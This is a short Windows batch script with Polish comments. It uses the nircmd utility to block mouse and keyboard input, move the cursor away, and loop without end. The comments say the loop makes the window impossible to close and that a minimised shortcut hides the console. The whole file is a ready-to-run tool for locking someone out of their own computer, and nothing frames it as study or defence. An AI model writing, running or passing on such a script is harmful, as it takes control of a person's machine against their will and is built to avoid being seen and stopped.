@echo off
:: Ukrycie okna konsoli (działa tylko jeśli uruchomisz przez skrót)
:: Wymaga utworzenia skrótu do .bat i ustawienia go jako uruchamianie "Minimized"

:: Ścieżka do nircmd
set nircmdPath=%~dp0nircmd.exe

:: Wyłączenie myszy i klawiatury
echo Blocking mouse and keyboard...
%nircmdPath% blockinput 1

:: Ukrycie kursora myszy
%nircmdPath% showsystrayicon 0
%nircmdPath% setcursor 0 0

:: Zapętlenie nieskończone, żeby okno było cały czas aktywne i nie można było go zamknąć
:loop
timeout /t 9999 > nul
goto loop
